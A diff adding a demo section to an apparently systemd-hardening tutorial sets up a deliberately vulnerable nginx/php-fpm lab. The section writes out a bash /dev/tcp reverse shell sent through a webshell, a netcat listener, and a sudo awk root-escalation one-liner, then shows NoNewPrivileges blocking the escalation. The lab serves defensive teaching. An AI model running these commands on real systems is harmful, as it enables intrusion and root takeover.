@@ -150,6 +150,133 @@ Well done! We obtained a good result passing from **9.6** to **4.9**, partially 
 
 
 
+## Demo
+
+If you want to try by yourself to setup a common systemd service, I provided for you a basic **ansible** script to deploy a working environment to make some practice.
+
+The ansible provisioner script is available under `ansible/` directory of the same repository.
+
+This, deploy for you a little (vulnerable) environment to understand and configure the **php-fpm** systemd service, allowing you to reduce the attack surface, using some of the features listed above.
+
+### Scenario
+
+Suppose you have an **nginx** webserver which is hosting your php website. The scenario I created, starts from the possibility to have a RCE, using the webshell uploaded by the attacker.
+
+Once inside the system you'll be able to understand how, step-by-step, it's possible to reduce the attack surface just using some **systemd** feature.
+
+### Prerequirements
+
+To use the ansible script, you'll need at least a **CentOS 8.1** system to deploy the entire installation.
+
+### Environment Setup
+
+Once you installed the system, you are ready to deploy the environment with ansible following the steps below.
+
+Copy your ssh keys onto the system:
+
+`ssh-copy-id root@your-webserver.ip`
+
+Go under the `ansible/` directory of this repository:
+
+`cd ansible/`
+
+Define the inventory replacing the variable 'ansible_host' with your webserver ip as shown below:
+
+```ini
+[php-webserver]
+
+webserver ansible_host=your-webserver.ip
+```
+
+Deploy the environment with ansible:
+
+`ansible-playbook -i inventory -v main.yml -u root`
+
+Once finished you are ready to start the demo.
+
+### Getting Started
+
+Using your browser, you'll find the vulnerable service at http://your-webserver.ip/webshell.php.
+
+You can gain a revers shell just using **netcat** from your local machine:
+
+`nc -lnvp 4444`, 
+
+and put this command onto the webshell input form:
+
+`bash -i >& /dev/tcp/your-local.ip/4444 0>&1`.
+
+The result is show in the image below:
+
+![](./webshell.png)
+
+At this time you're ready to check step-by-step the improvements of systemd's features, applying them to the `/etc/systemc/system/php-fpm.service` file.
+
+#### Step #1
+
+* Once inside the system we can try to exploit it by searching for misconfigurations.
+
+  One of them is located into the `/etc/sudoers` file.
+
+  We can recognize this by typing the command `sudo -l`.
+
+  The result is shown below:
+
+  `(root) NOPASSWD: /usr/bin/awk`
+
+  This means we can use `awk` as sudo.
+
+  To exploit this misconfiguration we can use the following command:
+
+  `sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'`
+
+  At this point we should have become the **root** user!
+
+  But, how can we protect ourselves form this kind of privilege escalation? The answer is explained on the following rows.
+
+* First of all, verify the security exposure of **php-fpm.service** by typing:
+
+  `systemd-analyze security php-fpm`
+
+  The result is:
+
+  `→ Overall exposure level for php-fpm.service: 9.2 UNSAFE 😨`.
+
+  Now, edit the **php-fpm** service by typing:
+
+  `systemctl edit --full php-fpm`,
+
+  and add the following feature under the `[Service]` section:
+
+  `NoNewPrivileges=true`
+
+  This permits to block some kind of privilege escalation from the current user to another (in out case from **apache** to **root**).
+
+* Check the entered feature is available and typo errors are not presents:
+
+  `systemd-analyze verify php-fpm.service`
+
+  Restart the php-fpm service by typing:
+
+  `systemctl restart php-fpm`,
+
+  and try to repeat the exploitation.
+
+* As you can observe now, the command `sudo -l` report to us the following message:
+
+  `sudo: effective uid is not 0, is sudo installed setuid root?`.
+
+  This means we prevented the privilege escalation enabling the `NoNewPrivileges` feature!
+
+* Also verify the security exposure now:
+
+  ```bash
+  systemd-analyze security php-fpm.service
+  → Overall exposure level for php-fpm.service: 9.0 UNSAFE 😨
+  ```
+
+  We reduced the exposure of 0.2 points by preventing the privilege escalation.
+
 ## References
 1. https://lincolnloop.com/blog/sandboxing-services-systemd/
 2. https://dev.to/djmoch/hardening-services-with-systemd-2md7
